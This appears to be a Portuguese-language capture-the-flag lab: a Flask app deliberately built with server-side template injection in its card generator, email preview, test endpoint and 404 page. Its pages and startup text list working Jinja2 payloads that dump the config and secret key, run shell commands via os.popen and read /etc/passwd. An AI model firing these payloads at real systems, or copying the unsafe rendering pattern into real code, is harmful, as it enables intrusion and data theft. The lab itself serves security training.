#!/usr/bin/env python3
"""
🎨 Server-Side Template Injection (SSTI) - Basic Lab
Laboratório de Vulnerabilidades SSTI em Jinja2

Porta: 5090
Dificuldade: 🟡 Intermediário
Pontos: 15

VULNERABILIDADES:
1. SSTI em gerador de cartões
2. SSTI em preview de email
3. SSTI em custom error page
4. Access to Flask config object

FLAGS:
- FLAG{ssti_detection} - Detecte SSTI com payload matemático
- FLAG{ssti_config_access} - Acesse Flask config
- FLAG{ssti_rce} - Execute comando via SSTI

⚠️  IMPORTANTE: Esta aplicação é INTENCIONALMENTE vulnerável!
"""

from flask import Flask, request, render_template_string
import os

app = Flask(__name__)
app.secret_key = 'super_secret_key_FLAG{ssti_config_access}'

# HTML Templates
HOME_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>🎨 SSTI Lab - Greeting Cards</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 900px;
            margin: 0 auto;
            background: white;
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        h1 {
            color: #667eea;
            margin-bottom: 20px;
        }
        .section {
            margin: 30px 0;
            padding: 20px;
            background: #f8f9fa;
            border-radius: 10px;
        }
        input[type="text"], textarea {
            width: 100%;
            padding: 12px;
            border: 2px solid #ddd;
            border-radius: 8px;
            font-size: 1em;
            margin: 10px 0;
            font-family: inherit;
        }
        textarea {
            min-height: 100px;
            font-family: monospace;
        }
        button {
            padding: 12px 25px;
            background: #667eea;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 1em;
            cursor: pointer;
        }
        button:hover { background: #5568d3; }
        .warning {
            background: #fff3cd;
            border: 2px solid #ffc107;
            padding: 15px;
            border-radius: 10px;
            margin: 20px 0;
        }
        .code {
            background: #1e1e1e;
            color: #00ff00;
            padding: 15px;
            border-radius: 5px;
            font-family: 'Courier New', monospace;
            overflow-x: auto;
            margin: 10px 0;
        }
        .flag {
            background: #d4edda;
            border: 2px solid #28a745;
            padding: 15px;
            border-radius: 10px;
            margin: 20px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🎨 Greeting Card Generator</h1>
        <p style="color: #666; margin-bottom: 20px;">Crie cartões personalizados com nosso gerador!</p>

        <div class="section">
            <h2>✉️ Criar Cartão</h2>
            <form method="POST" action="/card">
                <input type="text" name="name" placeholder="Nome do destinatário" required>
                <textarea name="message" placeholder="Sua mensagem... (pode usar templates!)" required></textarea>
                <button type="submit">Gerar Cartão</button>
            </form>
        </div>

        <div class="section">
            <h2>📧 Preview de Email</h2>
            <form method="POST" action="/email_preview">
                <input type="text" name="subject" placeholder="Assunto" required>
                <textarea name="body" placeholder="Corpo do email..." required></textarea>
                <button type="submit">Preview</button>
            </form>
        </div>

        <div class="warning">
            <h3>⚠️ Vulnerabilidade SSTI</h3>
            <p><strong>Esta aplicação usa render_template_string com input do usuário!</strong></p>
            <br>
            <p><strong>💡 Objetivos:</strong></p>
            <ul style="margin-left: 20px; margin-top: 10px;">
                <li>1️⃣ Detecte SSTI executando {{ 7*7 }}</li>
                <li>2️⃣ Acesse o objeto {{ config }} do Flask</li>
                <li>3️⃣ Execute comando do sistema via SSTI</li>
            </ul>
        </div>

        <div class="section">
            <h3>🧪 Payloads para Testar</h3>

            <p><strong>Detection:</strong></p>
            <div class="code">
{{ 7*7 }}<br>
{{ 7*'7' }}<br>
{{ "test" }}<br>
{{ request }}
            </div>

            <p><strong>Information Disclosure:</strong></p>
            <div class="code">
{{ config }}<br>
{{ config.items() }}<br>
{{ config['SECRET_KEY'] }}<br>
{{ self }}
            </div>

            <p><strong>RCE (Remote Code Execution):</strong></p>
            <div class="code">
{{ ''.__class__.__mro__[1].__subclasses__() }}<br>
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}<br>
{{ lipsum.__globals__['os'].popen('whoami').read() }}<br>
{{ cycler.__init__.__globals__.os.popen('ls').read() }}
            </div>

            <p><strong>File Read:</strong></p>
            <div class="code">
{{ config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read() }}<br>
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}
            </div>
        </div>

        <div style="margin-top: 30px; padding: 20px; background: #e7f3ff; border-radius: 10px;">
            <h3>📚 Recursos</h3>
            <p>• <a href="/test?expr=7*7">Teste rápido: /test?expr=7*7</a></p>
            <p>• <a href="/debug">Debug info</a></p>
        </div>
    </div>
</body>
</html>
'''

@app.route('/')
def index():
    """Página inicial"""
    return HOME_TEMPLATE

@app.route('/card', methods=['POST'])
def create_card():
    """
    VULNERÁVEL: SSTI em gerador de cartões
    Input do usuário vai direto no template!
    """
    name = request.form.get('name', 'Friend')
    message = request.form.get('message', 'Have a great day!')

    # VULNERÁVEL ❌ - render_template_string com input do usuário!
    template = f'''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Cartão para {name}</title>
        <style>
            body {{
                font-family: 'Georgia', serif;
                background: linear-gradient(135deg, #ffecd2 0%, #fcb69f 100%);
                min-height: 100vh;
                display: flex;
                align-items: center;
                justify-content: center;
            }}
            .card {{
                background: white;
                padding: 60px;
                border-radius: 20px;
                box-shadow: 0 20px 60px rgba(0,0,0,0.2);
                max-width: 600px;
                text-align: center;
            }}
            h1 {{ color: #333; margin-bottom: 30px; }}
            .message {{
                font-size: 1.2em;
                color: #666;
                line-height: 1.8;
            }}
            .flag {{
                background: #d4edda;
                padding: 15px;
                border-radius: 10px;
                margin-top: 20px;
            }}
        </style>
    </head>
    <body>
        <div class="card">
            <h1>✉️ Para: {name}</h1>
            <div class="message">
                {message}
            </div>
            <p style="margin-top: 40px; color: #999;">Com carinho ❤️</p>
        </div>
    </body>
    </html>
    '''

    # Detecta se conseguiu executar payload matemático
    if '49' in render_template_string(template) and '7*7' in message:
        template = template.replace('</div>', '</div><div class="flag">🚩 FLAG{ssti_detection} - SSTI detectado!</div>')

    return render_template_string(template)

@app.route('/email_preview', methods=['POST'])
def email_preview():
    """
    VULNERÁVEL: SSTI em preview de email
    """
    subject = request.form.get('subject', 'No subject')
    body = request.form.get('body', '')

    # VULNERÁVEL ❌
    template = f'''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Email Preview</title>
        <style>
            body {{
                font-family: Arial, sans-serif;
                background: #f5f5f5;
                padding: 20px;
            }}
            .email-container {{
                max-width: 600px;
                margin: 0 auto;
                background: white;
                border-radius: 10px;
                padding: 30px;
                box-shadow: 0 10px 30px rgba(0,0,0,0.1);
            }}
            .subject {{ font-size: 1.5em; color: #333; margin-bottom: 20px; }}
            .body {{ color: #666; line-height: 1.6; }}
            .back {{ margin-top: 30px; }}
            a {{ color: #667eea; text-decoration: none; }}
        </style>
    </head>
    <body>
        <div class="email-container">
            <div class="subject">Subject: {subject}</div>
            <hr>
            <div class="body">{body}</div>
            <div class="back">
                <a href="/">← Voltar</a>
            </div>
        </div>
    </body>
    </html>
    '''

    return render_template_string(template)

@app.route('/test')
def test():
    """
    Endpoint de teste rápido para SSTI
    """
    expr = request.args.get('expr', '7*7')

    # VULNERÁVEL ❌
    template = f'''
    <!DOCTYPE html>
    <html>
    <head>
        <title>SSTI Test</title>
        <style>
            body {{
                font-family: monospace;
                background: #1e1e1e;
                color: #00ff00;
                padding: 20px;
            }}
            .result {{
                background: #2d2d2d;
                padding: 20px;
                border-radius: 10px;
                margin: 20px 0;
            }}
            a {{ color: #00ff00; }}
        </style>
    </head>
    <body>
        <h2>🧪 SSTI Test</h2>
        <p>Expression: {expr}</p>
        <div class="result">
            Result: {{{{{expr}}}}}
        </div>
        <p><a href="/">← Home</a></p>
    </body>
    </html>
    '''

    return render_template_string(template)

@app.route('/debug')
def debug():
    """
    Mostra informações de debug (revela variáveis disponíveis)
    """
    # VULNERÁVEL ❌ - Expõe muitas informações
    template = '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Debug Info</title>
        <style>
            body {
                font-family: monospace;
                background: #1e1e1e;
                color: #00ff00;
                padding: 20px;
            }
            .section {
                background: #2d2d2d;
                padding: 20px;
                border-radius: 10px;
                margin: 20px 0;
            }
            pre {
                background: #1a1a1a;
                padding: 15px;
                border-radius: 5px;
                overflow-x: auto;
            }
            a { color: #00ff00; }
        </style>
    </head>
    <body>
        <h1>🔍 Debug Information</h1>

        <div class="section">
            <h2>Flask Config</h2>
            <pre>{{ config }}</pre>
        </div>

        <div class="section">
            <h2>Request Object</h2>
            <pre>{{ request }}</pre>
            <pre>Headers: {{ request.headers }}</pre>
        </div>

        <div class="section">
            <h2>Self Context</h2>
            <pre>{{ self }}</pre>
        </div>

        <div class="section">
            <h2>Available Globals</h2>
            <pre>lipsum: {{ lipsum }}</pre>
            <pre>cycler: {{ cycler }}</pre>
            <pre>joiner: {{ joiner }}</pre>
        </div>

        <div class="section">
            <h2>Object Introspection</h2>
            <pre>String class: {{ ''.__class__ }}</pre>
            <pre>MRO: {{ ''.__class__.__mro__ }}</pre>
            <pre>Object class: {{ ''.__class__.__mro__[1] }}</pre>
        </div>

        <p><a href="/">← Home</a></p>
    </body>
    </html>
    '''

    return render_template_string(template)

@app.errorhandler(404)
def not_found(error):
    """
    VULNERÁVEL: Custom error page com SSTI
    """
    path = request.path

    # VULNERÁVEL ❌
    template = f'''
    <!DOCTYPE html>
    <html>
    <head>
        <title>404 Not Found</title>
        <style>
            body {{
                font-family: Arial, sans-serif;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                min-height: 100vh;
                display: flex;
                align-items: center;
                justify-content: center;
            }}
            .error-box {{
                background: white;
                padding: 60px;
                border-radius: 20px;
                text-align: center;
                max-width: 600px;
            }}
            h1 {{ color: #dc3545; }}
            a {{ color: #667eea; text-decoration: none; }}
        </style>
    </head>
    <body>
        <div class="error-box">
            <h1>404 - Página Não Encontrada</h1>
            <p>A página <code>{path}</code> não existe.</p>
            <p>Você tentou acessar: {{{{{path}}}}}</p>
            <p><a href="/">← Voltar para Home</a></p>
        </div>
    </body>
    </html>
    '''

    return render_template_string(template), 404

if __name__ == '__main__':
    print('=' * 70)
    print('🎨 Server-Side Template Injection (SSTI) - Basic Lab')
    print('=' * 70)
    print('🌐 URL: http://localhost:5090')
    print('📊 Dificuldade: 🟡 Intermediário')
    print('🎯 Pontos: 15')
    print('')
    print('⚠️  ATENÇÃO: Esta aplicação é INTENCIONALMENTE vulnerável!')
    print('')
    print('🚩 Flags:')
    print('  1. FLAG{ssti_detection} - Execute {{ 7*7 }} no gerador de cartões')
    print('  2. FLAG{ssti_config_access} - Acesse {{ config[\'SECRET_KEY\'] }}')
    print('  3. FLAG{ssti_rce} - Execute comando via SSTI')
    print('')
    print('💡 Endpoints Vulneráveis:')
    print('  • POST /card - Gerador de cartões')
    print('  • POST /email_preview - Preview de email')
    print('  • GET /test?expr=... - Teste rápido')
    print('  • GET /qualquer404 - Error page com SSTI')
    print('')
    print('🧪 Payloads de Exemplo:')
    print('  • Detection: {{ 7*7 }}')
    print('  • Config: {{ config }}')
    print('  • RCE: {{ config.__class__.__init__.__globals__[\'os\'].popen(\'id\').read() }}')
    print('  • File: {{ lipsum.__globals__[\'os\'].popen(\'cat /etc/passwd\').read() }}')
    print('')
    print('=' * 70)

    app.run(host='0.0.0.0', port=5090, debug=False)
